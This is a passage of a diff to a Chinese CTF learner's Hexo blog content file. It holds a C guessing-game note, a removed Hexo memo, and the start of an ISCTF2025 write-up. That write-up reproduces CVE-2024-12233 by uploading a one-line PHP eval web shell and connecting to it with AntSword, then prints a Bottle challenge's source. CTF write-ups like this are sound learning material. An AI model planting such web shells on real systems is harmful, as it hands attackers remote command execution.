-<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span> <span class="comment">// 必须</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;time.h&gt;</span>   <span class="comment">// 必须</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    srand(time(<span class="literal">NULL</span>)); <span class="comment">// 1. 播种</span></span><br><span class="line">    <span class="type">int</span> target = rand() % <span class="number">100</span> + <span class="number">1</span>; <span class="comment">// 2. 生成 1-100</span></span><br><span class="line">    <span class="type">int</span> guess;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> (<span class="number">1</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;猜数: &quot;</span>);</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;guess);</span><br><span class="line">        <span class="keyword">if</span> (guess == target) &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;恭喜猜中!\n&quot;</span>);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (guess &gt; target) &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;太大了\n&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;太小了\n&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p><strong>易错：</strong></p>
-<ol>
-<li><p>忘记写 <code>srand</code>，导致每次运行生成的随机数一样。</p>
-</li>
-<li><p>取余公式写错，生成了 0 到 99 而不是 1 到 100。</p>
+<li><p><code>default</code> 拼写错误。</p>
 </li>
 </ol>
 ]]></content>
@@ -782,46 +815,13 @@
       </tags>
   </entry>
   <entry>
-    <title>Hexo命令与配置备忘录</title>
-    <url>/2025/12/09/Hexo%E5%8D%9A%E5%AE%A2%E7%BB%B4%E6%8A%A4%E6%8C%87%E5%8D%97/</url>
-    <content><![CDATA[<blockquote>
-<p>这是一篇写给我自己的备忘录，记录了博客日常维护、写文章和修改配置的常用命令。</p>
-</blockquote>
-<h2 id="常用命令速查"><a href="#常用命令速查" class="headerlink" title="常用命令速查"></a>常用命令速查</h2><p>在终端进入博客目录 <code>~/Hello_CTF/my_ctf_blog</code> 后使用。</p>
-<h3 id="1-发布博客"><a href="#1-发布博客" class="headerlink" title="1. 发布博客"></a>1. 发布博客</h3><ol>
-<li><p>创建新的markdown文件：</p>
- <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">hexo new <span class="string">&quot;新的wp&quot;</span></span><br></pre></td></tr></table></figure>
-<p> 然后目录出现<code>新的wp.md</code></p>
-</li>
-<li><p>根据自身要求修改文件属性：</p>
- <figure class="highlight markdown"><table><tr><td class="code"><pre><span class="line">---</span><br><span class="line">title: 这里写文章标题            # 标题：随便写，支持中文</span><br><span class="line">date: 2025-12-09 18:00:00       # 发布时间：注意格式，冒号后有空格</span><br><span class="line">updated: 2025-12-10 12:00:00    # 更新时间：可选，不写默认等于发布时间</span><br><span class="line">tags:                           # 标签：扁平化，一篇可以有多个</span><br><span class="line"><span class="bullet">    -</span> CTF</span><br><span class="line"><span class="bullet">    -</span> Web</span><br><span class="line">categories:                     # 分类：层级化，支持父子关系</span><br><span class="line"><span class="bullet">    -</span> 学习笔记                   #父分类</span><br><span class="line"><span class="section">    - 渗透测试                   # 子分类</span></span><br><span class="line"><span class="section">---</span></span><br></pre></td></tr></table></figure>
-<p> 注意事项：</p>
-<ul>
-<li>冒号后面必须有一个空格（比如 title: 标题 是对的，title:标题 是错的）。</li>
-<li>缩进：分类和标签的列表要对齐。</li>
-</ul>
-<p> 还有“特效”字段：<br> <figure class="highlight markdown"><table><tr><td class="code"><pre><span class="line">---</span><br><span class="line">cover: /img/封面图.png           # 首页卡片显示的封面图</span><br><span class="line">top<span class="emphasis">_img: /img/顶部图.png         # 点进文章后，顶部那个长条背景图</span></span><br><span class="line"><span class="emphasis">                                # (如果不写，默认显示你在 _</span>config.butterfly.yml 设置的那张 default<span class="emphasis">_top_</span>img)</span><br><span class="line"></span><br><span class="line">comments: true                  # 是否开启评论 (默认为 true，填 false 可关闭这篇的评论)</span><br><span class="line">toc: true                       # 是否显示右侧目录 (默认为 true)</span><br><span class="line">toc<span class="emphasis">_number: true                # 目录是否显示序号 (1. 1.1 ...)</span></span><br><span class="line"><span class="emphasis">copyright: true                 # 是否显示文末版权信息</span></span><br><span class="line"><span class="emphasis">---    </span></span><br></pre></td></tr></table></figure><br> 例如我想写c语言学习笔记：<br> <figure class="highlight markdown"><table><tr><td class="code"><pre><span class="line">---</span><br><span class="line">title: C语言学习笔记01</span><br><span class="line">date: 2025-12-09 20:00:00</span><br><span class="line">updated: 2025-12-09 20:00:00</span><br><span class="line">categories:</span><br><span class="line"><span class="bullet">-</span> 编程语言      </span><br><span class="line"><span class="bullet">-</span> C语言         </span><br><span class="line">tags: </span><br><span class="line"><span class="bullet">-</span> C语言</span><br><span class="line">cover: /img/sg<span class="emphasis">_meter.jpg   </span></span><br><span class="line"><span class="emphasis">top_</span>img: /img/sg<span class="emphasis">_lab.jpg   </span></span><br><span class="line"><span class="emphasis">toc: true</span></span><br><span class="line"><span class="emphasis">toc_</span>number: true</span><br><span class="line">---</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">正文...</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure></p>
-</li>
-<li><p>清理、构建、部署：</p>
- <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">hexo clean &amp;&amp; hexo g &amp;&amp; hexo d</span><br></pre></td></tr></table></figure></li>
-</ol>
-<h3 id="2"><a href="#2" class="headerlink" title="2."></a>2.</h3>]]></content>
-      <categories>
-        <category>博客搭建</category>
-      </categories>
-      <tags>
-        <tag>Hexo</tag>
-        <tag>备忘录</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>ISCTF2025 wp</title>
     <url>/2025/12/11/ISCTF2025%20wp/</url>
     <content><![CDATA[<h1 id="1-b-by-n0t1ce-b0ard"><a href="#1-b-by-n0t1ce-b0ard" class="headerlink" title="1. \b@by n0t1ce b0ard"></a>1. \b@by n0t1ce b0ard</h1><p>提示很明显了，是CVE-2024-12233，上网查找进行复现</p>
 <p>例如Email: <code>111@test.com</code>，同时上传shell.php，内容如下：</p>
 <figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> @<span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;cmd&#x27;</span>]); <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
 
-<p>然后蚁剑连接http:&#x2F;&#x2F;[题目IP]&#x2F;images&#x2F;<a href="mailto:&#x31;&#49;&#x31;&#64;&#116;&#x65;&#115;&#x74;&#46;&#x63;&#x6f;&#109;">111@test.com</a>&#x2F;shell.php</p>
+<p>然后蚁剑连接http:&#x2F;&#x2F;[题目IP]&#x2F;images&#x2F;<a href="mailto:&#x31;&#x31;&#x31;&#64;&#x74;&#x65;&#x73;&#116;&#46;&#99;&#x6f;&#x6d;">111@test.com</a>&#x2F;shell.php</p>
 <hr>
 <h1 id="2-难过的bottle"><a href="#2-难过的bottle" class="headerlink" title="2. 难过的bottle"></a>2. 难过的bottle</h1><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> bottle <span class="keyword">import</span> route, run, template, post, request, static_file, error</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> zipfile</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> shutil</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># hint: flag is in /flag</span></span><br><span class="line"></span><br><span class="line">UPLOAD_DIR = <span class="string">&#x27;uploads&#x27;</span></span><br><span class="line">os.makedirs(UPLOAD_DIR, exist_ok=<span class="literal">True</span>)</span><br><span class="line">MAX_FILE_SIZE = <span class="number">1</span> * <span class="number">1024</span> * <span class="number">1024</span>  <span class="comment"># 1MB</span></span><br><span class="line"></span><br><span class="line">BLACKLIST = [<span class="string">&quot;b&quot;</span>,<span class="string">&quot;c&quot;</span>,<span class="string">&quot;d&quot;</span>,<span class="string">&quot;e&quot;</span>,<span class="string">&quot;h&quot;</span>,<span class="string">&quot;i&quot;</span>,<span class="string">&quot;j&quot;</span>,<span class="string">&quot;k&quot;</span>,<span class="string">&quot;m&quot;</span>,<span class="string">&quot;n&quot;</span>,<span class="string">&quot;o&quot;</span>,<span class="string">&quot;p&quot;</span>,<span class="string">&quot;q&quot;</span>,<span class="string">&quot;r&quot;</span>,<span class="string">&quot;s&quot;</span>,<span class="string">&quot;t&quot;</span>,<span class="string">&quot;u&quot;</span>,<span class="string">&quot;v&quot;</span>,<span class="string">&quot;w&quot;</span>,<span class="string">&quot;x&quot;</span>,<span class="string">&quot;y&quot;</span>,<span class="string">&quot;z&quot;</span>,<span class="string">&quot;%&quot;</span>,<span class="string">&quot;;&quot;</span>,<span class="string">&quot;,&quot;</span>,<span class="string">&quot;&lt;&quot;</span>,<span class="string">&quot;&gt;&quot;</span>,<span class="string">&quot;:&quot;</span>,<span class="string">&quot;?&quot;</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">contains_blacklist</span>(<span class="params">content</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;检查内容是否包含黑名单中的关键词（不区分大小写）&quot;&quot;&quot;</span></span><br><span class="line">    content = content.lower()</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">any</span>(black_word <span class="keyword">in</span> content <span class="keyword">for</span> black_word <span class="keyword">in</span> BLACKLIST)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">safe_extract_zip</span>(<span class="params">zip_path, extract_dir</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;安全解压ZIP文件（防止路径遍历攻击）&quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">with</span> zipfile.ZipFile(zip_path, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> zf:</span><br><span class="line">        <span class="keyword">for</span> member <span class="keyword">in</span> zf.infolist():</span><br><span class="line">            member_path = os.path.realpath(os.path.join(extract_dir, member.filename))</span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> member_path.startswith(os.path.realpath(extract_dir)):</span><br><span class="line">                <span class="keyword">raise</span> ValueError(<span class="string">&quot;非法文件路径: 路径遍历攻击检测&quot;</span>)</span><br><span class="line">            </span><br><span class="line">            zf.extract(member, extract_dir)</span><br><span class="line"></span><br><span class="line"><span class="meta">@route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="string">&quot;&quot;&quot;首页&quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">&lt;!DOCTYPE html&gt;</span></span><br><span class="line"><span class="string">&lt;html lang=&quot;zh-CN&quot;&gt;</span></span><br><span class="line"><span class="string">&lt;head&gt;</span></span><br><span class="line"><span class="string">    &lt;meta charset=&quot;UTF-8&quot;&gt;</span></span><br><span class="line"><span class="string">    &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt;</span></span><br><span class="line"><span class="string">    &lt;title&gt;ZIP文件查看器&lt;/title&gt;</span></span><br><span class="line"><span class="string">    &lt;link href=&quot;https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css&quot; rel=&quot;stylesheet&quot;&gt;</span></span><br><span class="line"><span class="string">    &lt;link rel=&quot;stylesheet&quot; href=&quot;/static/css/style.css&quot;&gt;</span></span><br><span class="line"><span class="string">&lt;/head&gt;</span></span><br><span class="line"><span class="string">&lt;body&gt;</span></span><br><span class="line"><span class="string">    &lt;div class=&quot;header text-center&quot;&gt;</span></span><br><span class="line"><span class="string">        &lt;div class=&quot;container&quot;&gt;</span></span><br><span class="line"><span class="string">            &lt;h1 class=&quot;display-4 fw-bold&quot;&gt;📦 ZIP文件查看器&lt;/h1&gt;</span></span><br><span class="line"><span class="string">            &lt;p class=&quot;lead&quot;&gt;安全地上传和查看ZIP文件内容&lt;/p&gt;</span></span><br><span class="line"><span class="string">        &lt;/div&gt;</span></span><br><span class="line"><span class="string">    &lt;/div&gt;</span></span><br><span class="line"><span class="string">    &lt;div class=&quot;container&quot;&gt;</span></span><br><span class="line"><span class="string">        &lt;div class=&quot;row justify-content-center&quot; id=&quot;index-page&quot;&gt;</span></span><br><span class="line"><span class="string">            &lt;div class=&quot;col-md-8 text-center&quot;&gt;</span></span><br><span class="line"><span class="string">                &lt;div class=&quot;card&quot;&gt;</span></span><br><span class="line"><span class="string">                    &lt;div class=&quot;card-body p-5&quot;&gt;</span></span><br><span class="line"><span class="string">                        &lt;div class=&quot;emoji-icon&quot;&gt;📤&lt;/div&gt;</span></span><br><span class="line"><span class="string">                        &lt;h2 class=&quot;card-title&quot;&gt;轻松查看ZIP文件内容&lt;/h2&gt;</span></span><br><span class="line"><span class="string">                        &lt;p class=&quot;card-text&quot;&gt;上传ZIP文件并安全地查看其中的内容，无需解压到本地设备&lt;/p&gt;</span></span><br><span class="line"><span class="string">                        &lt;div class=&quot;mt-4&quot;&gt;</span></span><br><span class="line"><span class="string">                            &lt;a href=&quot;/upload&quot; class=&quot;btn btn-primary btn-lg px-4 me-3&quot;&gt;</span></span><br><span class="line"><span class="string">                                📁 上传ZIP文件</span></span><br><span class="line"><span class="string">                            &lt;/a&gt;</span></span><br><span class="line"><span class="string">                            &lt;a href=&quot;#features&quot; class=&quot;btn btn-outline-secondary btn-lg px-4&quot;&gt;</span></span><br><span class="line"><span class="string">                                ℹ️ 了解更多</span></span><br><span class="line"><span class="string">                            &lt;/a&gt;</span></span><br><span class="line"><span class="string">                        &lt;/div&gt;</span></span><br><span class="line"><span class="string">                    &lt;/div&gt;</span></span><br><span class="line"><span class="string">                &lt;/div&gt;</span></span><br><span class="line"><span class="string">            &lt;/div&gt;</span></span><br><span class="line"><span class="string">        &lt;/div&gt;</span></span><br><span class="line"><span class="string">        &lt;div class=&quot;row mt-5&quot; id=&quot;features&quot;&gt;</span></span><br><span class="line"><span class="string">            &lt;div class=&quot;col-md-4 mb-4&quot;&gt;</span></span><br><span class="line"><span class="string">                &lt;div class=&quot;card h-100&quot;&gt;</span></span><br><span class="line"><span class="string">                    &lt;div class=&quot;card-body text-center p-4&quot;&gt;</span></span><br><span class="line"><span class="string">                        &lt;div class=&quot;emoji-icon&quot;&gt;🛡️&lt;/div&gt;</span></span><br><span class="line"><span class="string">                        &lt;h4&gt;安全检测&lt;/h4&gt;</span></span><br><span class="line"><span class="string">                        &lt;p&gt;系统会自动检测上传文件，防止路径遍历攻击和恶意内容&lt;/p&gt;</span></span><br><span class="line"><span class="string">                    &lt;/div&gt;</span></span><br><span class="line"><span class="string">                &lt;/div&gt;</span></span><br><span class="line"><span class="string">            &lt;/div&gt;</span></span><br><span class="line"><span class="string">            &lt;div class=&quot;col-md-4 mb-4&quot;&gt;</span></span><br><span class="line"><span class="string">                &lt;div class=&quot;card h-100&quot;&gt;</span></span><br><span class="line"><span class="string">                    &lt;div class=&quot;card-body text-center p-4&quot;&gt;</span></span><br><span class="line"><span class="string">                        &lt;div class=&quot;emoji-icon&quot;&gt;📄&lt;/div&gt;</span></span><br><span class="line"><span class="string">                        &lt;h4&gt;内容预览&lt;/h4&gt;</span></span><br><span class="line"><span class="string">                        &lt;p&gt;直接在线查看ZIP文件中的文本内容，无需下载&lt;/p&gt;</span></span><br><span class="line"><span class="string">                    &lt;/div&gt;</span></span><br><span class="line"><span class="string">                &lt;/div&gt;</span></span><br><span class="line"><span class="string">            &lt;/div&gt;</span></span><br><span class="line"><span class="string">            &lt;div class=&quot;col-md-4 mb-4&quot;&gt;</span></span><br><span class="line"><span class="string">                &lt;div class=&quot;card h-100&quot;&gt;</span></span><br><span class="line"><span class="string">                    &lt;div class=&quot;card-body text-center p-4&quot;&gt;</span></span><br><span class="line"><span class="string">                        &lt;div class=&quot;emoji-icon&quot;&gt;⚡&lt;/div&gt;</span></span><br><span class="line"><span class="string">                        &lt;h4&gt;快速处理&lt;/h4&gt;</span></span><br><span class="line"><span class="string">                        &lt;p&gt;高效处理小于1MB的ZIP文件，快速获取内容&lt;/p&gt;</span></span><br><span class="line"><span class="string">                    &lt;/div&gt;</span></span><br><span class="line"><span class="string">                &lt;/div&gt;</span></span><br><span class="line"><span class="string">            &lt;/div&gt;</span></span><br><span class="line"><span class="string">        &lt;/div&gt;</span></span><br><span class="line"><span class="string">    &lt;/div&gt;</span></span><br><span class="line"><span class="string">    &lt;script src=&quot;https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/js/bootstrap.bundle.min.js&quot;&gt;&lt;/script&gt;</span></span><br><span class="line"><span class="string">&lt;/body&gt;</span></span><br><span class="line"><span class="string">&lt;/html&gt;</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@route(<span class="params"><span class="string">&#x27;/upload&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">upload_page</span>():</span><br><span class="line">    <span class="string">&quot;&quot;&quot;上传页面&quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">&lt;!DOCTYPE html&gt;</span></span><br><span class="line"><span class="string">&lt;html lang=&quot;zh-CN&quot;&gt;</span></span><br><span class="line"><span class="string">&lt;head&gt;</span></span><br><span class="line"><span class="string">    &lt;meta charset=&quot;UTF-8&quot;&gt;</span></span><br><span class="line"><span class="string">    &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt;</span></span><br><span class="line"><span class="string">    &lt;title&gt;上传ZIP文件&lt;/title&gt;</span></span><br><span class="line"><span class="string">    &lt;link href=&quot;https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css&quot; rel=&quot;stylesheet&quot;&gt;</span></span><br><span class="line"><span class="string">    &lt;link rel=&quot;stylesheet&quot; href=&quot;/static/css/style.css&quot;&gt;</span></span><br><span class="line"><span class="string">&lt;/head&gt;</span></span><br><span class="line"><span class="string">&lt;body&gt;</span></span><br><span class="line"><span class="string">    &lt;div class=&quot;header text-center&quot;&gt;</span></span><br><span class="line"><span class="string">        &lt;div class=&quot;container&quot;&gt;</span></span><br><span class="line"><span class="string">            &lt;h1 class=&quot;display-4 fw-bold&quot;&gt;📦 ZIP文件查看器&lt;/h1&gt;</span></span><br><span class="line"><span class="string">            &lt;p class=&quot;lead&quot;&gt;安全地上传和查看ZIP文件内容&lt;/p&gt;</span></span><br><span class="line"><span class="string">        &lt;/div&gt;</span></span><br><span class="line"><span class="string">    &lt;/div&gt;</span></span><br><span class="line"><span class="string">    &lt;div class=&quot;container mt-4&quot;&gt;</span></span><br><span class="line"><span class="string">        &lt;div class=&quot;row justify-content-center&quot;&gt;</span></span><br><span class="line"><span class="string">            &lt;div class=&quot;col-md-8&quot;&gt;</span></span><br><span class="line"><span class="string">                &lt;div class=&quot;card&quot;&gt;</span></span><br><span class="line"><span class="string">                    &lt;div class=&quot;card-header bg-primary text-white&quot;&gt;</span></span><br><span class="line"><span class="string">                        &lt;h4 class=&quot;mb-0&quot;&gt;📤 上传ZIP文件&lt;/h4&gt;</span></span><br><span class="line"><span class="string">                    &lt;/div&gt;</span></span><br><span class="line"><span class="string">                    &lt;div class=&quot;card-body&quot;&gt;</span></span><br><span class="line"><span class="string">                        &lt;form action=&quot;/upload&quot; method=&quot;post&quot; enctype=&quot;multipart/form-data&quot; class=&quot;upload-form&quot;&gt;</span></span><br><span class="line"><span class="string">                            &lt;div class=&quot;mb-3&quot;&gt;</span></span><br><span class="line"><span class="string">                                &lt;label for=&quot;fileInput&quot; class=&quot;form-label&quot;&gt;选择ZIP文件（最大1MB）&lt;/label&gt;</span></span><br><span class="line"><span class="string">                                &lt;input class=&quot;form-control&quot; type=&quot;file&quot; name=&quot;file&quot; id=&quot;fileInput&quot; accept=&quot;.zip&quot; required&gt;</span></span><br><span class="line"><span class="string">                                &lt;div class=&quot;form-text&quot;&gt;仅支持.zip格式的文件，且文件大小不超过1MB&lt;/div&gt;</span></span><br><span class="line"><span class="string">                            &lt;/div&gt;</span></span><br><span class="line"><span class="string">                            &lt;button type=&quot;submit&quot; class=&quot;btn btn-primary w-100&quot;&gt;</span></span><br><span class="line"><span class="string">                                📤 上传文件</span></span><br><span class="line"><span class="string">                            &lt;/button&gt;</span></span><br><span class="line"><span class="string">                        &lt;/form&gt;</span></span><br><span class="line"><span class="string">                    &lt;/div&gt;</span></span><br><span class="line"><span class="string">                &lt;/div&gt;</span></span><br><span class="line"><span class="string">                &lt;div class=&quot;text-center mt-4&quot;&gt;</span></span><br><span class="line"><span class="string">                    &lt;a href=&quot;/&quot; class=&quot;btn btn-outline-secondary&quot;&gt;</span></span><br><span class="line"><span class="string">                        ↩️ 返回首页</span></span><br><span class="line"><span class="string">                    &lt;/a&gt;</span></span><br><span class="line"><span class="string">                &lt;/div&gt;</span></span><br><span class="line"><span class="string">            &lt;/div&gt;</span></span><br><span class="line"><span class="string">        &lt;/div&gt;</span></span><br><span class="line"><span class="string">    &lt;/div&gt;</span></span><br><span class="line"><span class="string">    &lt;script src=&quot;https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/js/bootstrap.bundle.min.js&quot;&gt;&lt;/script&gt;</span></span><br><span class="line"><span class="string">&lt;/body&gt;</span></span><br><span class="line"><span class="string">&lt;/html&gt;</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@post(<span class="params"><span class="string">&#x27;/upload&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">upload</span>():</span><br><span class="line">    <span class="string">&quot;&quot;&quot;处理文件上传&quot;&quot;&quot;</span></span><br><span class="line">    zip_file = request.files.get(<span class="string">&#x27;file&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> zip_file <span class="keyword">or</span> <span class="keyword">not</span> zip_file.filename.endswith(<span class="string">&#x27;.zip&#x27;</span>):</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;请上传有效的ZIP文件&#x27;</span></span><br><span class="line">    </span><br><span class="line">    zip_file.file.seek(<span class="number">0</span>, <span class="number">2</span>)  </span><br><span class="line">    file_size = zip_file.file.tell()</span><br><span class="line">    zip_file.file.seek(<span class="number">0</span>)  </span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> file_size &gt; MAX_FILE_SIZE:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">f&#x27;文件大小超过限制(<span class="subst">&#123;MAX_FILE_SIZE/<span class="number">1024</span>/<span class="number">1024</span>&#125;</span>MB)&#x27;</span></span><br><span class="line">    </span><br><span class="line">    timestamp = <span class="built_in">str</span>(time.time())</span><br><span class="line">    unique_str = zip_file.filename + timestamp</span><br><span class="line">    dir_hash = hashlib.md5(unique_str.encode()).hexdigest()</span><br><span class="line">    extract_dir = os.path.join(UPLOAD_DIR, dir_hash)</span><br><span class="line">    os.makedirs(extract_dir, exist_ok=<span class="literal">True</span>)</span><br><span class="line">    </span><br><span class="line">    zip_path = os.path.join(extract_dir, <span class="string">&#x27;uploaded.zip&#x27;</span>)</span><br><span class="line">    zip_file.save(zip_path)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        safe_extract_zip(zip_path, extract_dir)</span><br><span class="line">    <span class="keyword">except</span> (zipfile.BadZipFile, ValueError) <span class="keyword">as</span> e:</span><br><span class="line">        shutil.rmtree(extract_dir) </span><br><span class="line">        <span class="keyword">return</span> <span class="string">f&#x27;处理ZIP文件时出错: <span class="subst">&#123;<span class="built_in">str</span>(e)&#125;</span>&#x27;</span></span><br><span class="line">    </span><br><span class="line">    files = [f <span class="keyword">for</span> f <span class="keyword">in</span> os.listdir(extract_dir) <span class="keyword">if</span> f != <span class="string">&#x27;uploaded.zip&#x27;</span>]</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> template(<span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">&lt;!DOCTYPE html&gt;</span></span><br><span class="line"><span class="string">&lt;html lang=&quot;zh-CN&quot;&gt;</span></span><br><span class="line"><span class="string">&lt;head&gt;</span></span><br><span class="line"><span class="string">    &lt;meta charset=&quot;UTF-8&quot;&gt;</span></span><br><span class="line"><span class="string">    &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt;</span></span><br><span class="line"><span class="string">    &lt;title&gt;上传成功&lt;/title&gt;</span></span><br><span class="line"><span class="string">    &lt;link href=&quot;https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css&quot; rel=&quot;stylesheet&quot;&gt;</span></span><br><span class="line"><span class="string">    &lt;link rel=&quot;stylesheet&quot; href=&quot;/static/css/style.css&quot;&gt;</span></span><br><span class="line"><span class="string">&lt;/head&gt;</span></span><br><span class="line"><span class="string">&lt;body&gt;</span></span><br><span class="line"><span class="string">    &lt;div class=&quot;header text-center&quot;&gt;</span></span><br><span class="line"><span class="string">        &lt;div class=&quot;container&quot;&gt;</span></span><br><span class="line"><span class="string">            &lt;h1 class=&quot;display-4 fw-bold&quot;&gt;📦 ZIP文件查看器&lt;/h1&gt;</span></span><br><span class="line"><span class="string">            &lt;p class=&quot;lead&quot;&gt;安全地上传和查看ZIP文件内容&lt;/p&gt;</span></span><br><span class="line"><span class="string">        &lt;/div&gt;</span></span><br><span class="line"><span class="string">    &lt;/div&gt;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    &lt;div class=&quot;container mt-4&quot;&gt;</span></span><br><span class="line"><span class="string">        &lt;div class=&quot;row justify-content-center&quot;&gt;</span></span><br><span class="line"><span class="string">            &lt;div class=&quot;col-md-8&quot;&gt;</span></span><br><span class="line"><span class="string">                &lt;div class=&quot;card&quot;&gt;</span></span><br><span class="line"><span class="string">                    &lt;div class=&quot;card-header bg-success text-white&quot;&gt;</span></span><br><span class="line"><span class="string">                        &lt;h4 class=&quot;mb-0&quot;&gt;✅ 上传成功!&lt;/h4&gt;</span></span><br><span class="line"><span class="string">                    &lt;/div&gt;</span></span><br><span class="line"><span class="string">                    &lt;div class=&quot;card-body&quot;&gt;</span></span><br><span class="line"><span class="string">                        &lt;div class=&quot;alert alert-success&quot; role=&quot;alert&quot;&gt;</span></span><br><span class="line"><span class="string">                            ✅ 文件已成功上传并解压</span></span><br><span class="line"><span class="string">                        &lt;/div&gt;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">                        &lt;h5&gt;文件列表:&lt;/h5&gt;</span></span><br><span class="line"><span class="string">                        &lt;ul class=&quot;list-group mb-4&quot;&gt;</span></span><br><span class="line"><span class="string">                            % for file in files:</span></span><br><span class="line"><span class="string">                            &lt;li class=&quot;list-group-item d-flex justify-content-between align-items-center&quot;&gt;</span></span><br><span class="line"><span class="string">                                &lt;span&gt;📄 &#123;&#123;file&#125;&#125;&lt;/span&gt;</span></span><br><span class="line"><span class="string">                                &lt;a href=&quot;/view/&#123;&#123;dir_hash&#125;&#125;/&#123;&#123;file&#125;&#125;&quot; class=&quot;btn btn-sm btn-outline-primary&quot;&gt;</span></span><br><span class="line"><span class="string">                                    查看</span></span><br><span class="line"><span class="string">                                &lt;/a&gt;</span></span><br><span class="line"><span class="string">                            &lt;/li&gt;</span></span><br><span class="line"><span class="string">                            % end</span></span><br><span class="line"><span class="string">                        &lt;/ul&gt;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">                        % if files:</span></span><br><span class="line"><span class="string">                        &lt;div class=&quot;d-grid gap-2&quot;&gt;</span></span><br><span class="line"><span class="string">                            &lt;a href=&quot;/view/&#123;&#123;dir_hash&#125;&#125;/&#123;&#123;files[0]&#125;&#125;&quot; class=&quot;btn btn-primary&quot;&gt;</span></span><br><span class="line"><span class="string">                                👀 查看第一个文件</span></span><br><span class="line"><span class="string">                            &lt;/a&gt;</span></span><br><span class="line"><span class="string">                        &lt;/div&gt;</span></span><br><span class="line"><span class="string">                        % end</span></span><br><span class="line"><span class="string">                    &lt;/div&gt;</span></span><br><span class="line"><span class="string">                &lt;/div&gt;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">                &lt;div class=&quot;text-center mt-4&quot;&gt;</span></span><br><span class="line"><span class="string">                    &lt;a href=&quot;/upload&quot; class=&quot;btn btn-outline-primary me-2&quot;&gt;</span></span><br><span class="line"><span class="string">                        ➕ 上传另一个文件</span></span><br><span class="line"><span class="string">                    &lt;/a&gt;</span></span><br><span class="line"><span class="string">                    &lt;a href=&quot;/&quot; class=&quot;btn btn-outline-secondary&quot;&gt;</span></span><br><span class="line"><span class="string">                        🏠 返回首页</span></span><br><span class="line"><span class="string">                    